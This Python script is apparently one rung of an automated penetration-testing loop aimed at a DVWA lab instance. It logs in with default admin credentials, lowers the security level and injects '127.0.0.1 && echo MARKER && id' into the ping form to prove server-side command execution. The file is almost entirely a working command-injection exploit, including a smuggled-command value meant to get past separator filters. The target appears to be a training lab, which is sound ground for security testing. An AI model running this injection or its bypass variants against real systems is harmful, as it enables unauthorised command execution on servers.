"""ESCALATION VARIANT — brain-escalate-v1.py rung.
RUNG exec/and-separator: && chains commands when the ';' separator is
stripped by a naive filter.
Base probe copied verbatim except the single payload line below;
verdict logic, marker handling and BASE constant unchanged so the
loop's rebasing and the verifier's re-run contract hold.
"""
import requests, re, sys
B='http://172.17.0.1:3100'
marker = sys.argv[1] if len(sys.argv) > 1 else 'CMDI7719'
s=requests.Session()
r=s.get(B+'/login.php', timeout=10)
t=re.search(r"name='user_token' value='([^']+)'", r.text)
tok=t.group(1) if t else ''
d={'username':'admin','password':'password','Login':'Login','user_token':tok}
r=s.post(B+'/login.php', data=d, timeout=10)
r=s.get(B+'/security.php', timeout=10)
t=re.search(r"name='user_token' value='([^']+)'", r.text)
tok2=t.group(1) if t else ''
r=s.post(B+'/security.php', data={'security':'low','seclev_submit':'Submit','user_token':tok2}, timeout=10)
r0=s.post(B+'/vulnerabilities/exec/', data={'ip':'127.0.0.1','Submit':'Submit'}, timeout=15)
print('control', r0.status_code, 'len', len(r0.text))
print('control marker present:', marker in r0.text)
print('control uid present:', 'uid=' in r0.text)
# Inject: echo the marker AND run `id` — the uid= output is real command
# execution on the server, a distinctive signal the verifier recognises.
r1=s.post(B+'/vulnerabilities/exec/', data={'ip':'127.0.0.1 && echo '+marker+' && id','Submit':'Submit'}, timeout=15)
print('exec', r1.status_code, 'len', len(r1.text))
print('injected marker present:', marker in r1.text)
print('injected uid present:', 'uid=' in r1.text)
for line in r1.text.split('\n'):
    if marker in line or 'uid=' in line:
        print('REFLECTED LINE:', line.strip()[:220])

# VERDICT (playbook rule #3 — must be the LAST line of output).
# uid= in the injected response but not the control proves real
# server-side command execution (uid=33(www-data)).
injected_uid = 'uid=' in r1.text
injected_marker = marker in r1.text
control_uid = 'uid=' in r0.text
print('verdict signals: injected_uid=%s injected_marker=%s control_uid=%s' % (injected_uid, injected_marker, control_uid))
if injected_uid and injected_marker and not control_uid:
    print('VERDICT: CONFIRMED')
else:
    print('VERDICT: FAILED')
